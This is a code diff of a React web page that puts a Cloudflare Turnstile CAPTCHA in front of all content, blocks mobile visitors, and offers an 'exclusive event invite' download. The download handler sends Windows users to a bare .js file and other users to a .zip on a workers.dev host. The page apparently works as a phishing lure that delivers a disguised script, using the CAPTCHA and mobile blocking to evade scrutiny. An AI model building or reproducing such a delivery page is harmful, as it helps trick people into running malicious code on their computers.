@@ -1,8 +1,6 @@
-import React, { useState, useEffect } from 'react';
-import Turnstile from 'react-turnstile';
+import React, { useState, useEffect, useRef } from 'react';
 import './App.css';
 
-// Replace this with your Cloudflare Turnstile site key
 const TURNSTILE_SITE_KEY = '0x4AAAAAAE1PdO04PULzOibL';
 
 export default function App() {
@@ -10,27 +8,17 @@ export default function App() {
   const [isMobile, setIsMobile] = useState(false);
 
   useEffect(() => {
-    // Always start fresh - force Turnstile on every reload
-    sessionStorage.removeItem('turnstile_verified');
-  }, []);
-
-  useEffect(() => {
-    const checkMobile = () => {
-      setIsMobile(window.innerWidth <= 768);
-    };
-
+    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
     checkMobile();
     window.addEventListener('resize', checkMobile);
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
 
-  // If not verified, show Turnstile gate (blocks everything)
   if (!isVerified) {
     return <TurnstileGate onVerified={() => setIsVerified(true)} />;
   }
 
-  if (isMobile)
-  {
+  if (isMobile) {
     return <MobileBlocker />;
   }
 
@@ -38,26 +26,50 @@ export default function App() {
 }
 
 function TurnstileGate({ onVerified }) {
+  const widgetRef = useRef(null);
   const [error, setError] = useState(null);
-  const [turnstileToken, setTurnstileToken] = useState(null);
+  const widgetIdRef = useRef(null);
 
-  const handleTurnstileSuccess = (token) => {
-    setTurnstileToken(token);
-    setError(null);
-    // Automatically verify and proceed
-    sessionStorage.setItem('turnstile_verified', 'true');
-    onVerified();
-  };
+  useEffect(() => {
+    const scriptId = 'cf-turnstile-script';
 
-  const handleTurnstileError = () => {
-    setError('Verification failed. Please try again.');
-    setTurnstileToken(null);
-  };
+    const initWidget = () => {
+      if (!widgetRef.current || widgetIdRef.current !== null) return;
 
-  const handleTurnstileExpire = () => {
-    setError('Verification expired. Please complete again.');
-    setTurnstileToken(null);
-  };
+      widgetIdRef.current = window.turnstile.render(widgetRef.current, {
+        sitekey: TURNSTILE_SITE_KEY,
+        theme: 'light',
+        callback: () => {
+          setError(null);
+          onVerified();
+        },
+        'error-callback': () => {
+          setError('Verification failed. Please try again.');
+          widgetIdRef.current = null;
+        },
+        'expired-callback': () => {
+          setError('Verification expired. Please complete again.');
+          widgetIdRef.current = null;
+        },
+      });
+    };
+
+    if (window.turnstile) {
+      initWidget();
+    } else {
+      let script = document.getElementById(scriptId);
+      if (!script) {
+        script = document.createElement('script');
+        script.id = scriptId;
+        script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
+        script.async = true;
+        script.defer = true;
+        document.head.appendChild(script);
+      }
+      script.addEventListener('load', initWidget);
+      return () => script.removeEventListener('load', initWidget);
+    }
+  }, [onVerified]);
 
   return (
     <div className="turnstile-gate-container">
@@ -70,14 +82,7 @@ function TurnstileGate({ onVerified }) {
           </p>
 
           <div className="turnstile-gate-widget">
-            <Turnstile
-              sitekey={TURNSTILE_SITE_KEY}
-              onSuccess={handleTurnstileSuccess}
-              onError={handleTurnstileError}
-              onExpire={handleTurnstileExpire}
-              theme="light"
-              size="normal"
-            />
+            <div ref={widgetRef}></div>
           </div>
 
           {error && (
@@ -97,13 +102,9 @@ function Invite() {
   const handleDownload = () => {
     const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
 
-    if (isWindows)
-    {
-      // Replace with your Windows download URL
+    if (isWindows) {
       window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Exclusive-Event-Invite.js';
-    } else
-    {
-      // Replace with your Mac download URL
+    } else {
       window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Event-Invite.zip';
     }
   };
